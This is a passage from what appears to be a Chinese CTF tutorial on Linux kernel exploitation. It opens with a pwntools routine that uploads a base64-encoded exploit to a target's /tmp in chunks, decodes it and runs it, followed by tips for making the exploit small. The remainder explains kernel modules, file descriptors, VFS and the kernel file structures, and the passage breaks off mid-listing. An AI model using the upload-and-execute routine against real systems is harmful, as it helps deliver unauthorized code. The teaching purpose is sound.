&#123;task.total&#125;&quot;</span>, justify=<span class="string">&quot;right&quot;</span>),</span><br><span class="line">    TransferSpeedColumn(),</span><br><span class="line">    TimeRemainingColumn()</span><br><span class="line">) <span class="keyword">as</span> progress:</span><br><span class="line">    task = progress.add_task(<span class="string">&quot;sending exploit...&quot;</span>, total=<span class="built_in">len</span>(exp), completed=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(exp), chunk_size):</span><br><span class="line">        chunk = exp[i:i + chunk_size]</span><br><span class="line">        p.sendlineafter(banner, <span class="string">f&quot;echo -n &#x27;<span class="subst">&#123;chunk&#125;</span>&#x27; &gt;&gt; /tmp/b64_exp&quot;</span>.encode())</span><br><span class="line">        progress.update(task, advance=<span class="built_in">len</span>(chunk))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(banner, <span class="string">b&quot;cat /tmp/b64_exp | base64 -d &gt; /tmp/exploit&quot;</span>)</span><br><span class="line">p.sendlineafter(banner, <span class="string">b&quot;chmod +x /tmp/exploit&quot;</span>)</span><br><span class="line">p.sendlineafter(banner, <span class="string">b&quot;/tmp/exploit &quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<p>由于一般的 ctf 环境会在 <code>init</code> 脚本中设置定时关机（一般为 120 秒），这就需要我们的 exp 尽可能小。我们通常有如下角度 作优化：</p>
<ul>
<li><p>借助编译参数</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -static -Os -s -ffunction-sections -fdata-sections -Wl,--gc-sections -flto -o exp exp.c</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>-Os</code>：GCC 提供的专门用于优化代码大小的选项。</li>
<li><code>-s</code>：从生成的 ELF 文件中删除符号信息和调试信息。</li>
<li><code>-ffunction-sections -fdata-sections</code>：将每个函数和数据放入单独的节中，便于链接器去除未使用的部分。</li>
<li><code>-Wl,--gc-sections</code>：链接器会自动去除未使用的节，从而减小最终的可执行文件大小。</li>
<li><code>-flto</code>：启用链接时优化，可以进一步消除未使用的代码和数据。</li>
</ul>
</li>
<li><p>使用更小的标准库</p>
<p>标准 C 库（如 <code>glibc</code>）通常较大，使用更小的替代品可以显著减小 ELF 文件大小。例如 <code>musl</code> 是一个轻量级的 C 标准库，适用于嵌入式和资源受限的环境。</p>
<ul>
<li><p>安装 <code>musl</code> 工具链</p>
  <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install musl-tools</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>编译程序：用 <code>musl-gcc</code> 代替 <code>gcc</code>，要注意的是 musl 的支持性不如 glibc。</p>
</li>
</ul>
</li>
<li><p>使用压缩工具</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx --best --lzma exp</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h1 id="Linux-内核模块"><a href="#Linux-内核模块" class="headerlink" title="Linux 内核模块"></a>Linux 内核模块</h1><p><strong>LKM（Loadable Kernel Module）</strong> 是指<strong>可加载内核模块</strong>，通常存储在 <code>/lib/modules/$(uname -r)/kernel/</code> 目录下。它是 Linux 内核的一个重要概念。LKM 使得 Linux 内核能够在运行时动态加载或卸载模块，而无需重新编译或重启操作系统。这种模块化设计可以弥补 Linux 内核作为宏内核的不足，使得 Linux 内核非常灵活，能够根据实际需求添加新功能或更新现有功能。</p>
<p><strong>内核模块相关命令：</strong></p>
<ul>
<li><code>insmod</code>：将制定模块加载到内核中。</li>
<li><code>rmmod</code>：从内核中卸载制定模块。</li>
<li><code>lsmod</code>：列出已经加载的模块。</li>
<li><code>modinfo</code>：查看模块信息。</li>
</ul>
<h2 id="万物皆文件"><a href="#万物皆文件" class="headerlink" title="万物皆文件"></a>万物皆文件</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p><strong>“万物皆文件”</strong>是 Linux 和类 UNIX 系统的核心设计理念之一。它将所有系统资源（包括硬件设备、进程、网络套接字等）抽象为文件，提供了一种统一的接口（如<code>open</code>、<code>read</code>、<code>write</code>、<code>close</code>、<code>ioctl</code> 等）进行操作。这种设计不仅简化了系统资源的管理，也提升了系统的灵活性和可扩展性。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/everything_is_file.svg"
                     
                ></p>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p>现代 Linux 系统的内核模块种类繁多，功能需求多样化，因此许多内核模块并不完全遵守“万物皆文件”的设计理念，也不是所有类型的模块都对应文件或通过文件操作相关的 API 进行交互。</p>
<p>例如一些网络数据包过滤相关的模块不是通过用户主动的文件操作进行交互的，而是通过发送一些网络数据包被动的进行交互。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">connect(sockfd, (<span class="keyword">struct</span> sockaddr *)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">send(sockfd, buffer, length, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>

<p>不过在 ctf 题目中涉及到的内核模块主要是<strong>字符设备</strong>，这一类内核模块遵守万物皆文件的设计理念，也是这里主要介绍的内核模块。</p>

    </div>
  </div>

<p>Linux 内核通过一套统一的抽象层和数据结构来支持“万物皆文件”理念，使得用户可以以文件的形式访问各种底层资源。这个实现机制的核心在于 VFS （Virtual File System，虚拟文件系统）抽象层，以及围绕 VFS 的数据结构（<code>super_block</code>、<code>inode</code>、<code>dentry</code>、<code>file</code>）和文件描述符（File Descriptor）管理方式。另外，设备文件、管道、套接字和特殊的虚拟文件系统（如 <code>/proc</code>、<code>/sys</code>）也通过特定的内核机制与 VFS 对接，从而为用户提供统一的文件接口。</p>
<h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><p>文件描述符（File Descriptor，简称 FD）是操作系统用来标识一个打开文件的整数值。在类 Unix 系统中，文件描述符是进程与操作系统内核之间进行文件操作的接口。每个文件描述符都关联着一个具体的文件或资源（例如：文件、管道、套接字等），并且通过文件描述符来访问这些资源。</p>
<p>文件描述符是一个非负整数，通常是一个从 0 开始的索引，用来标识进程打开的文件。</p>
<p>每个进程有自己的文件描述符表。在 Linux 系统中，进程结构体 <code>task_struct</code> 中有一个成员 <code>struct files_struct *files</code> 指向 <code>files_struct</code> 结构体。这个结构体主要是维护进程打开的文件，其中 <code>fd_array</code> 就是文件描述符表，这个表通过成员 <code>fdt</code> 指向的 <code>fdtab</code> 结构来进行维护。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 打开文件表结构体</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> &#123;</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 主要是读操作的部分</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">	<span class="type">atomic_t</span> count;  <span class="comment">// 文件结构体引用计数</span></span><br><span class="line">	<span class="type">bool</span> resize_in_progress;  <span class="comment">// 是否正在进行文件表扩展</span></span><br><span class="line">	<span class="type">wait_queue_head_t</span> resize_wait;  <span class="comment">// 等待文件表扩展完成的等待队列</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> __<span class="title">rcu</span> *<span class="title">fdt</span>;</span>  <span class="comment">// 文件描述符表（RCU 形式）</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> <span class="title">fdtab</span>;</span>  <span class="comment">// 文件描述符表的具体实现</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 写操作部分，存储在不同的缓存行，以优化 SMP（对称多处理）性能</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">	<span class="type">spinlock_t</span> file_lock ____cacheline_aligned_in_smp;  <span class="comment">// 文件表锁，确保多核环境下的同步</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> next_fd;  <span class="comment">// 下一个可用的文件描述符</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> close_on_exec_init[<span class="number">1</span>];  <span class="comment">// 存储 close-on-exec 标志的初始化位</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> open_fds_init[<span class="number">1</span>];  <span class="comment">// 存储已打开文件的初始化位</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> full_fds_bits_init[<span class="number">1</span>];  <span class="comment">// 存储所有文件描述符的初始化位</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> __<span class="title">rcu</span> * <span class="title">fd_array</span>[<span class="title">NR_OPEN_DEFAULT</span>];</span>  <span class="comment">// 文件描述符数组，存储每个文件的指针（RCU 形式）</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>当进程启动时，操作系统会为其自动打开三个文件描述符，这些文件描述符分别对应标准输入、标准输出和标准错误：</p>
<ul>
<li><strong>0</strong>：标准输入（stdin）</li>
<li><strong>1</strong>：标准输出（stdout）</li>
<li><strong>2</strong>：标准错误（stderr）</li>
</ul>
<p>这些文件描述符在程序中可直接使用，其他的文件描述符会在程序中打开新文件时分配。</p>
<p>例如当进程打开一个文件时，操作系统会分配一个文件描述符，并返回该文件描述符给程序。此时，程序可以使用该文件描述符来进行文件读写操作。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;file.txt&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;Failed to open file&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 使用文件描述符 fd 进行文件操作</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    <span class="type">ssize_t</span> bytes_read = read(fd, buffer, <span class="keyword">sizeof</span>(buffer)); <span class="comment">// 读写文件</span></span><br><span class="line">    <span class="keyword">if</span> (bytes_read &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 处理读取的数据</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    close(fd); <span class="comment">// 关闭文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="虚拟文件系统-VFS"><a href="#虚拟文件系统-VFS" class="headerlink" title="虚拟文件系统 (VFS)"></a>虚拟文件系统 (VFS)</h3><p>VFS 是内核中的一个抽象层，负责为各种不同的文件系统提供统一的接口。VFS 不存储实际文件数据，它是一个中间层，实现了对不同类型文件系统的抽象和统一管理，使操作系统能以相同的方式访问不同类型的存储介质和资源。</p>
<p>VFS 的数据结构关系如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-kernel-pwn-basic-knowlege/images/VFS.svg"
                      alt="VFS"
                ></p>
<p>其中 <code>inode</code> 结构体包含文件访问权限、所有者、组、大小、生成时间、访问时间、最后修改时间等信息。它是Linux管理文件系统的最基本单位，也是文件系统连接任何子目录、文件的桥梁。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> &#123;</span></span><br><span class="line">    <span class="type">umode_t</span>         i_mode; <span class="comment">// inode的权限</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>      i_opflags;</span><br><span class="line">    <span class="type">kuid_t</span>          i_uid; <span class="comment">// inode所有者的id</span></span><br><span class="line">    <span class="type">kgid_t</span>          i_gid; <span class="comment">// inode所属的群组id</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        i_flags;</span><br><span class="line">    ...</span><br><span class="line">    <span class="type">dev_t</span>           i_rdev; <span class="comment">// 若是设备文件，此字段将记录设备的设备号</span></span><br><span class="line">    <span class="type">loff_t</span>          i_size; <span class="comment">// inode所代表的文件大小</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_atime</span>;</span> <span class="comment">// inode最近一次的存取时间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_mtime</span>;</span> <span class="comment">// inode最近一次的修改时间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>     <span class="title">i_ctime</span>;</span> <span class="comment">// inode的产生时间</span></span><br><span class="line">    <span class="type">spinlock_t</span>      i_lock; <span class="comment">/* i_blocks, i_bytes, maybe i_size */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span>          i_bytes;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        i_blkbits;</span><br><span class="line">    <span class="type">blkcnt_t</span>        i_blocks; <span class="comment">// inode所使用的block数，一个block为512字节</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>  *<span class="title">i_pipe</span>;</span> <span class="comment">// 若是管道，为其对应的 pipe_inode_info 结构体指针</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">i_bdev</span>;</span> <span class="comment">// 若是块设备，为其对应的 block_device 结构体指针</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span>     *<span class="title">i_cdev</span>;</span> <span class="comment">// 若是字符设备，为其对应的 cdev 结构体指针</span></span><br><span class="line">        <span class="type">char</span> *i_link; <span class="comment">// 符号链接路径</span></span><br><span class="line">        <span class="type">unsigned</span> i_dir_seq; <span class="comment">// 目录序列号（用于目录变化的检测）</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></div>

<p>从其中的联合体成员我们可以看出 VFS 中的文件可以是管道文件、块设备文件、字符设备文件、符号链接文件和目录文件。</p>
<blockquote>
<p>在操作系统中，尤其是 Unix 和 Linux 操作系统中，设备被分为 <strong>块设备</strong>（Block Device）和 <strong>字符设备</strong>（Character Device）。这两种设备类型主要根据数据的存取方式以及与硬件的交互方式来区分。</p>
<ul>
<li>块设备是指可以以 <strong>块</strong> 为单位进行数据存取的设备。每个块通常是固定大小的（例如 512 字节、4 KB 或其他大小），并且这些设备支持 <strong>随机访问</strong>。块设备通常会在内存中进行缓冲（缓存），即数据块会先被读到内存中，然后再进行其他操作（例如写入磁盘），提高效率。硬盘（HDD）、固态硬盘（SSD）、光盘、USB 驱动器、虚拟磁盘等都属于块设备</li>
<li>字符设备是指按 <strong>字符</strong> 为单位进行数据存取的设备，这些设备是 <strong>顺序访问</strong> 的，通常不支持随机访问。字符设备与硬件设备的交互方式较为简单，数据是按字节流的形式传输的。键盘、鼠标、串行端口、终端、打印机、音频设备等都是字符设备。</li>
</ul>
</blockquote>
<p><code>file</code> 结构体代表一个打开的文件，系统中每个打开的文件在内核空间都有一个关联的 <code>struct file</code> 。它由内核在打开文件时创建，并传递给在文件上进行操作的任何函数。在文件的所有实例都关闭后，内核释放这个数据结构。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="comment">/* 联合体，用于存储不同的文件管理结构 */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="comment">/* 链表节点，文件可能在链表中管理 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span> <span class="title">fu_llist</span>;</span></span><br><span class="line">		<span class="comment">/* RCU（Read-Copy-Update）头，用于引用计数和延迟删除 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcpu_head</span> <span class="title">fu_rcuhead</span>;</span></span><br><span class="line">	&#125; f_u;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 文件路径，表示文件在文件系统中的位置 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span> <span class="title">f_path</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 缓存的 inode 指针，表示文件的 inode（文件元数据） */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">f_inode</span>;</span>		<span class="comment">/* 缓存的值 */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 文件操作结构体，包含该文件支持的操作（如读、写、打开等） */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 用于保护 f_ep_links 和 f_flags，防止并发访问时的数据损坏 */</span></span><br><span class="line">	<span class="type">spinlock_t</span> f_lock;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 提示文件是否会进行写操作，通常用于优化文件写入 */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">rw_hint</span> <span class="title">f_write_hint</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 文件引用计数，用于管理文件的打开计数 */</span></span><br><span class="line">	<span class="type">atomic_long_t</span> f_count;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 文件标志（如只读、只写等） */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> f_flags;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 文件的访问模式（读、写、读写） */</span></span><br><span class="line">	<span class="type">fmode_t</span> f_mode;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 锁定文件的偏移量，防止并发访问 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">f_pos_lock</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 当前文件读写位置，偏移量 */</span></span><br><span class="line">	<span class="type">loff_t</span> f_pos;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 文件的所有者结构体，表示文件的拥有者 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span> <span class="title">f_owner</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 文件的访问权限（凭证） */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">f_cred</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 文件预读状态，帮助进行文件的预读优化 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span> <span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 文件的版本号，用于管理文件的版本 */</span></span><br><span class="line">	u64 f_version;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="comment">/* 安全性相关的私有数据，用于文件的安全性管理 */</span></span><br><span class="line">	<span class="type">void</span> *f_security;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 驱动程序的私有数据，通常用于 tty 驱动 */</span></span><br><span class="line">	<span class="type">void</span> *private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* 文件用于事件通知（如 epoll） */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">f_ep_links</span>;</span></span><br><span class="line">	<span class="comment">/* 文件用于 epoll 的链表链接 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">f_tfile_llink</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 地址空间，文件数据存储的映射区域 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">f_mapping</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 文件写入错误状态 */</span></span><br><span class="line">	<span class="type">errseq_t</span> f_wb_err;</span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));	<span class="comment">/* 防止由于结构体对齐引起的问题，确保对齐为 4 字节 */</span></span><br></pre></td></tr></table></figure></div>

<h3 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h3><p><code>file</code> 结构体中的 <code>f_op</code> 成员指向的 <code>file_operations</code> 结构体中注册了操作这个文件所需的回调函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	<span class="type">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">	<span class="type">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">	<span class="type">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">	<span class="type">ssize_t</span> (*read_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line">	<span class="type">ssize_t</span> (*write_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line">	<span class="type">int</span> (*iterate) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line">	<span class="type">int</span> (*iterate_shared) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line">	<span class="type">__poll_t</span> (*poll) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *);</span><br><span class="line">	<span class="type">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">	<span class="type">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">	<span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> mmap_supported_flags;</span><br><span class="line">	<span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line">	<span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">	<span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line">	<span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line">	<span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">	<span class="type">ssize_t</span> (*sendpage) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> page *, <span class="type">int</span>, <span class="type">size_t</span>, <span class="type">loff_t</span> *, <span class="type">int</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">	<span class="type">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line">	<span class="type">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">	<span class="type">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">	<span class="type">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span 